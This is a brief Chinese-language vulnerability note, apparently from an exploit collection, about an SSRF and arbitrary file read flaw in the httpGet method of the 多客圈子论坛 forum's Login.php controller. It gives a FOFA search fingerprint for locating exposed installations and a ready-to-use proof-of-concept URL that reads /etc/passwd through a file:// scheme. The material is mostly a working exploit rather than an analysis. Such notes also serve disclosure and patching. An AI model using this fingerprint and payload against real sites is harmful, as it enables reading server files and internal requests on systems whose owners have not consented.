## 多客圈子论坛前台SSRF漏洞

/app/api/controller/Login.php 控制器中，httpGet方法存在curl_exec函数，且传参可控，导致任意文件读取+SSRF漏洞

## fofa

```
"/static/index/js/jweixin-1.2.0.js"
```

## poc

```
/index.php/api/login/httpGet?url=file:///etc/passwd
```

![image-20240621195011935](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406211950983.png)

## 漏洞来源

- https://mp.weixin.qq.com/s/S12FdNBxJXyS8QXrEHOTfg